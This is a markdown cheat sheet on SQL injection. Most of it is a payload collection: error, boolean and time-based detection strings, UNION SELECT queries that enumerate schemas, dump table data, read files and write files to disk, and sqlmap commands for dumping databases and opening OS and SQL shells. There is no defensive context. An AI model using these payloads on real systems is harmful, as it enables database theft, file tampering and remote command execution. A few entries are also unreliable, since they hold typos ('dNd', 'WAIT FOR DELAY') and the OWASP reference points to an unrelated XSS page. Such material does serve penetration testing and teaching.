# SQL injection

The SQL injection is one of the most common code injection technique that aims at getting access to the database. It's possible by improper handling of user input by the application. 

Related to: <br />
-Language: SQL <br />
-Platform: Any (requires interaction with a SQL database) <br />

Types of SQL injection: <br />
1) Error based <br />
2) Boolean based blind <br />
3) Time based blind <br />

Toolset: Burp Suite, SQL Map. <br />

Detection
-----------------------------------------------------------------------------

Detection of Error based SQL injection:
```
'
"
#
;
)
```
Encoding:
```
%27
%22
%23
%3B
```
Multiple encoding:
```
%%2727
%%2222
%%2323
%%3B3B
```
Detection of Boolean based blind SQL injection:<br />
TRUE statements:
```
aNd 1=1
aNd 21=21
anD 1=1;//
orDeR bY 1
```
FALSE statements:
```
dNd 0=1
anD 9=2
anD 57=276;//
ordEr bY 1000000000000
```
Characters to use instead of spaces:
```
+ 
/**/
%20
```
Comments to end the queries:
```
/*
//
#
%23
--
```

Detection of Time based blind:
```
aNd sleep
SLEEP(15)
BENCHMARK(100000000, rand())
WAIT FOR DELAY '00:00:15'
WAIT FOR TIME '00:00:15'
```


Exploitation
-----------------------------------------------------------------------------

General select syntax:
```
UniOn selEct [number of columns] [comment]
```

Example: Assume that there are two columns and the second column can be used to display data from db.
```
Seleting database version:
UniOn selEct 1,version() /*

Database:
UniOn selEct 1,database() /*

Database user:
UniOn selEct 1,user() /*

Database tables:
UniOn selEct 1,table_name frOm information_schema.tables where table_schema = '[database name]' /*

Table Columns:
UniOn selEct 1,column_name frOm information_schema.columns where table_name = '[table name]' /*

Selecting data from table:
UniOn selEct 1,[column name] frOm [table name] /*

Reading files:
UniOn selEct 1,load_file('file location') /*

Writing files:
UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
```
Notes:<br />
When you executing queries you need to consider encodings.<br />

Example of encoding query to utf8:
```
UniOn select table_name COLLATE utf8_general_ci,table_schema COLLATE utf8_general_ci,'1' from information_schema.tables
```

SQL Map
-----------------------------------------------------------------------------

```
sqlmap -u [url] --- scan the provided url

sqlmap -u [url] —-dbs --- show the databases 

sqlmap -u “url” —-tables -D [database name] --- show all tables from [database name]

sqlmap -u “url” —-columns -T [table name] -D [database name] --- show all columns from [table name] in [database name]

sqlmap -u “url” -T [table name] -D [database name] —-dump --- show all data from [table name] in [database name]

sqlmap -u “url” —-os-shell --- OS shell 

sqlmap -u “url” —-sql-shell --- SQL shell
```
-----------------------------------------------------------------------------
References:
[Wikipedia](https://en.wikipedia.org/wiki/SQL_injection)  
[Owasp](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
